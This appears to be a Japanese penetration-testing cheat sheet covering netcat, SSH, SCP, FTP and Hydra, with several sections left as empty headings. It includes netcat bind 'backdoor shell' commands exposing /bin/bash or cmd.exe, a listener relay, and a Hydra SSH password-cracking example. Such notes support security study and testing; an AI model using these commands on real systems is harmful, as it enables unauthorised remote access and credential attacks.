# high-frequency-tips
頻繁に使うコマンドのCheatSheet
(short link → bit.ly/spxntips)

## Netcat
オプション：
```
-l：リッスン
-n：名前解決を行わない
-k：コネクション確立後も接続をリッスンする
-v：接続状態などの出力を行う
-vv：接続状態などのより詳細な出力を行う
```
実行例(ポート1234でリッスン)：
```console
$ncat -nlv 1234
```
実行例(Backdoor Shell)
```console
$nc -l -p [port] -e /bin/bash
```
OR
```console
C:\>nc [port] -e cmd.exe
```
実行例(Ntcat Relays(Listener-to-Listner))
```console
$cd /tmp
$mknod backpipe p
$nc -l -p [port] 0<backpipe | nc -l -p [port] | tee backpipe
```
## SSH
オプション：
```
-p：ポート指定
-v：デバッグの出力
-vv：デバッグのより詳細な出力
-vvv："-vv"より更に詳細な出力
```
実行例(ターゲットのユーザに対してSSHで接続)
```console
$ssh user@[target(ip/hostname)]
```
### SCP(Secure Copy Protocol:SSH)
オプション：
```
-P：ポート指定
-v：デバッグの出力
-p：ファイルに付与されたタイムスタンプなどの情報を保持する
-r：再帰的(ディレクトリごと等)
*.txt：ワイルドカード
/home/user/{file1,file2,file3}：ファイルの複数選択 
```
実行例(リモートホストからローカルにコピーする)：
```console
$scp user@[target(ip/hostname)]:[remote_filepath] [local_filepath]
```
実行例(ローカルからリモートホストにコピーする)
```console
$scp [local_filepath] user@[target(ip/hostname)]:[remote_filepath]
```
## FTP
オプション：
```
-s:filename ：接続時にスクリプトを実行する
```
実行例(ターゲットに接続)：
```console
$ftp [target(ip/hostname)]
```
実行例(アップロード(FTP))：
```console
ftp>put [local_filepath]
```
実行例(ダウンロード(FTP))：
```console
ftp>get [remote_filepath]
```
## Hydra
オプション：
```
[service]：ssh, rdp, ftp, 
-C [file]：<login:pass>形式のUSERPASSリストを指定
-P [file]：PASSリストを指定
-U [file]：USERリストを指定
-s PORT：サービスが起動しているポート
-t：同時実行タスク数()
-v：詳細な出力
services: サービスの指定/対応サービス(asterisk afp cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql ncp nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp rexec rlogin rsh s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp)
```
実行例(sshパスクラ)：
```console
$hydra -C [USERPASS_FILE] [target(ip/hostname)] ssh
```
## John the Ripper
## HashCat
## Metasploit Framework
 ### Meterpreter
 ### msfvenom
 ### Pivot
## Network
 ### Routing
 ### ICMP
 ### ARP
## Google Dork
## Linux General Command
## Windows General Command
